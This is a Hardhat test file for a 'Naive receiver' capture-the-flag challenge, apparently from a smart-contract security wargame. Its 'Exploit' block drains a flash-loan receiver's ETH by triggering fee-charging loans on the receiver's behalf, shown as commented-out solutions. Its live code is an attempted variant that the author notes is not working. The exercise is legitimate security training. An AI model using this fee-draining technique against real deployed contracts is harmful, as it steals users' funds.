const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Naive receiver', function () {
    let deployer, user, attacker;

    // Pool has 1000 ETH in balance
    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    // Receiver has 10 ETH in balance
    const ETHER_IN_RECEIVER = ethers.utils.parseEther('10');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, user, attacker] = await ethers.getSigners();

        const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
        const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);

        this.pool = await LenderPoolFactory.deploy();
        await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
        
        expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL);
        expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));

        this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
        await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
        
        expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
    });

    it('Exploit', async function () {
        //This is a solution but is suboptimal
        // for(let i = 0; i < 10; i++){ 
        // await this.pool.connect(attacker).flashLoan(this.receiver.address, ethers.utils.parseEther('0'));
        // }

        //Solution 2
        //This is a solution to drain all the ether in one call
        //You need to comment the other solutions
        //await this.pool.connect(attacker).flashLoan(this.receiver.address, ethers.utils.parseEther('0'));


        //This should be a workaround to solution 2
        //We deploy our own FlashLoanReceiverFactoryV2
        //with the bad code inside of the 
        //_executeActionDuringFlashLoan() method
        //However this is somehow not working, 
        const FlashLoanReceiverFactoryV2 = await ethers.getContractFactory('FlashLoanReceiverV2', attacker);
        this.receiverV2 = await FlashLoanReceiverFactoryV2.deploy(this.pool.address);
        await attacker.sendTransaction({ to: this.receiverV2.address, value: ethers.utils.parseEther('10') });
        expect(await ethers.provider.getBalance(this.receiverV2.address)).to.be.equal(ethers.utils.parseEther('10'));
        await this.pool.connect(attacker).flashLoan(this.receiverV2.address, ethers.utils.parseEther('0'));

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // All ETH has been drained from the receiver
        expect(
            await ethers.provider.getBalance(this.receiver.address)
        ).to.be.equal('0');
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
    });
});
